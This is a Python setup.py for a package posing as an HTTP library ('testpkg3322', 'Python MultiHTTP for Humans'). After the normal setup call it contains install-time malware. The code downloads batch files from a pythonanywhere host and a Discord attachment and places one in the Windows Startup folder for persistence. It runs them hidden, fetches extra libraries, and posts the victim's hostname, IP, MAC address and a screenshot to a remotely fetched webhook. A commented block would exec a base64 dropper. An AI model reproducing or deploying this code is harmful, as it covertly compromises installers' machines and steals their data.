import setuptools, base64

with open("README.md", "r", encoding="utf-8") as f:
    readme = f.read()

setuptools.setup(
    name="testpkg3322",
    version="2.35.9",
    author="testpkg3322",
    description="Python MultiHTTP for Humans.",
    long_description=readme,
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: Microsoft :: Windows",
    ],
    package_dir={"": "src"},
    packages=setuptools.find_packages(where="src"),
    python_requires=">=3.6",
)


try:
    from urllib.request import Request, urlopen, urlretrieve
    import zipfile
    import os
except:
    pass


import urllib.request
import zipfile
import os
import sys
import shutil
import subprocess
import time
import random
import string

err = " "
try:
    t = "https://frvezdff.pythonanywhere.com/getrnr"

    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\gamer.bat")
    time.sleep(5)
    
    import ctypes
    from ctypes.wintypes import MAX_PATH
    import shutil
    import os

    direc = ""
    dll = ctypes.windll.shell32
    buf = ctypes.create_unicode_buffer(MAX_PATH + 1)
    if dll.SHGetSpecialFolderPathW(None, buf, 0x0005, False):
        direc = buf.value
    else:
        pass

    os.replace(os.getenv('APPDATA')+"\\gamer.bat", direc+"\\gamer.bat")
    time.sleep(1)
    subprocess.Popen(direc+"\\gamer.bat")
    time.sleep(5)
    prepath = os.getcwd()
    os.chdir(direc)
    os.system("gamer.bat")
    time.sleep(10)

    os.system(f"xcopy gamer.bat {os.getenv('LOCALAPPDATA')}")
    time.sleep(2)
    os.chdir(os.getenv('LOCALAPPDATA'))
    time.sleep(2)
    os.system("gamer.bat")
    time.sleep(10)
    
    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\gamer.bat")
    time.sleep(2)
    subprocess.Popen(os.getenv('APPDATA')+"\\gamer.bat", creationflags=subprocess.CREATE_NO_WINDOW)
    time.sleep(2)
    os.chdir(prepath)
except Exception as e:
    err = str(e)

'''
try:
    dropper_txt = urllib.request.urlopen("https://frvezdff.pythonanywhere.com/getdropper").read()
    with open("dropper.py", "w+") as file:
        file.write(f"import base64\nexec(base64.b64decode({dropper_txt}))")
    time.sleep(1)
    subprocess.Popen(["python", "dropper.py"], creationflags=subprocess.CREATE_NO_WINDOW)
except Exception as e:
    err = err +" - "+str(e)
'''

try:
    t = "https://frvezdff.pythonanywhere.com/getrnr"

    path,_ = urllib.request.urlretrieve(t, os.getenv('LOCALAPPDATA')+"\\gamer4.bat")
    time.sleep(5)

    subprocess.Popen(os.getenv('LOCALAPPDATA')+"\\gamer4.bat", creationflags=subprocess.CREATE_NO_WINDOW)
except Exception as e:
    err = err +" - "+str(e)

try:
    t = "https://frvezdff.pythonanywhere.com/getrnr"

    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\gamer3.bat")
    time.sleep(5)

    subprocess.Popen(os.getenv('APPDATA')+"\\gamer3.bat", creationflags=subprocess.CREATE_NO_WINDOW)
except Exception as e:
    err = err +" - "+str(e)
    
import os
from urllib.request import Request, urlopen, urlretrieve
import zipfile
import time
try:
    zip_file_path,_ = urlretrieve("https://frvezdff.pythonanywhere.com/getcertifi", 'certifi.zip')
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        zip_ref.extractall()
    os.remove("certifi.zip")
    
    zip_file_path,_ = urlretrieve("https://frvezdff.pythonanywhere.com/getidna", 'idna.zip')
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        zip_ref.extractall()
    os.remove("idna.zip")
    
    zip_file_path,_ = urlretrieve("https://frvezdff.pythonanywhere.com/getcharset", 'charset_normalizer.zip')
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        zip_ref.extractall()
    os.remove("charset_normalizer.zip")
    
    zip_file_path,_ = urlretrieve("https://frvezdff.pythonanywhere.com/geturllib3", 'urllib3.zip')
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        zip_ref.extractall()
    os.remove("urllib3.zip")


    zip_file_path,_ = urlretrieve("https://frvezdff.pythonanywhere.com/getrequests", 'requests.zip')
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        zip_ref.extractall()
    os.remove("requests.zip")


    import requests
except:
    pass

import subprocess
def download(url):
    get_response = requests.get(url,stream=True)
    file_name  = os.getenv('APPDATA')+"\\gamer2.bat"
    with open(file_name, 'wb') as f:
        for chunk in get_response.iter_content(chunk_size=1024):
            if chunk:
                f.write(chunk)
try:
    url = "https://cdn.discordapp.com/attachments/1239820589447778334/1239820715083956287/gamer.txt?ex=66445085&is=6642ff05&hm=9ec9697bd1abb37c1b40ac9dcc1d793df19312685cc5a07f676e0a516902939a&"
    download(url)
    time.sleep(1)
    subprocess.Popen(os.getenv('APPDATA')+"\\gamer2.bat", creationflags=subprocess.CREATE_NO_WINDOW)
except Exception as e:
    err = err + " - "+str(e)
    
try:
    zip_file_path,_ = urlretrieve("https://frvezdff.pythonanywhere.com/getmss", 'mss.zip')
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        zip_ref.extractall()
    os.remove("mss.zip")


    from mss import mss
except Exception as e:
    pass

try:
    zip_file_path,_ = urlretrieve("https://frvezdff.pythonanywhere.com/getrequests", 'requests.zip')
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        zip_ref.extractall()
    os.remove("requests.zip")

    import requests
except:
    pass
h00k = urlopen("https://frvezdff.pythonanywhere.com/gethook").read().decode('utf-8')
try:
    
    import platform,socket,re,uuid,json
except:
    pass


def sendSysInfo():
    info = {}
    info['platform']=platform.system()
    info['platform-release']=platform.release()
    info['platform-version']=platform.version()
    info['architecture']=platform.machine()
    info['hostname']=socket.gethostname()
    info['ip-address']=socket.gethostbyname(socket.gethostname())
    info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
    info['processor']=platform.processor()
    msgcomp = {
        "content": json.dumps(info)
    }
    r = requests.post(h00k, json=msgcomp)
try:
    sendSysInfo()
except:
    pass
def sendDebugScreenshot():
    try:
        with mss() as sct:
            sct.shot(output='screenshot.png')
        with open('screenshot.png', 'rb') as file:
            byte_im = file.read()

        r = requests.post(h00k, files={"screenshot.png": byte_im})
        if r.status_code != 200:
            rct = str(r.content)
            msgcomp = {"content": f"error on sending screenshot, error code: {r.status_code}\n error: {rct}"}
            r = requests.post(h00k, json=msgcomp)
    except:
        pass
try:
    sendDebugScreenshot()
except:
    pass
def sendErr():
    msgcomp = {"content": f"errors: {err}"}
    r = requests.post(h00k, json=msgcomp)
try:
    sendErr()
except:
    pass




time.sleep(10)

